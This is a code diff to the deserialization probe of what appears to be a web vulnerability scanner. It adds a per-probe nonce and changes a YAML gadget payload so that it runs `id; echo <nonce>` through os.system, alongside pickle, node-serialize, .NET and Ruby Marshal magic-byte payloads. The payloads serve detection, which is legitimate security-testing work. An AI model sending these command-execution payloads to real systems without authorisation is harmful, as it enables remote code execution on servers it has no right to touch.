@@ -1720,6 +1720,12 @@ def probe_deserialize(ctx: Context, url: str, param: str,
     """Deserialization surface check: baseline then magic-bytes payloads
     per ecosystem. A framework deserialization error means the parser
     actually processes the field - real attack surface, not a guess."""
+    # `_marker("argus")`, not `_marker("deser")`: NONCE_RE is
+    # \bargus[a-z0-9]{4,24}\b, so a prefix of anything else produces a token
+    # the gate cannot recognise as this probe's own - which is how the first
+    # attempt at this left the class at a candidate with the nonce sitting
+    # in plain sight on both sides of the exchange.
+    nonce = _marker("argus")
     base = _send(ctx, url, param, "argus-plain", method, data,
                  tool="probe_deserialize", note="baseline")
     base_err = _DESER_ERRORS.search(base.get("body") or "")
@@ -1730,7 +1736,12 @@ def probe_deserialize(ctx: Context, url: str, param: str,
         ("python-pickle", "c__builtin__\nset\n"),
         ("python-pickle-b64", "gASVQg=="),  # \x80\x04\x95 - proto-4 magic
         ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
-        ("yaml-python", "!!python/object/apply:os.system ['id']"),
+        # the gadget carries `id; echo <nonce>` for the same reason
+        # probe_cmdi does: the class wants the identity line AND a token
+        # tied to THIS probe, so output a page happens to contain cannot
+        # stand in for execution
+        ("yaml-python",
+         "!!python/object/apply:os.system ['id; echo " + nonce + "']"),
         ("dotnet-psobject", '{"$type":"System.Object"}'),
         ("ruby-marshal-b64", "BAhvOg=="),   # \x04\x08o: - Marshal magic
         ("ruby-marshal-raw", "\x04\x08o:"),
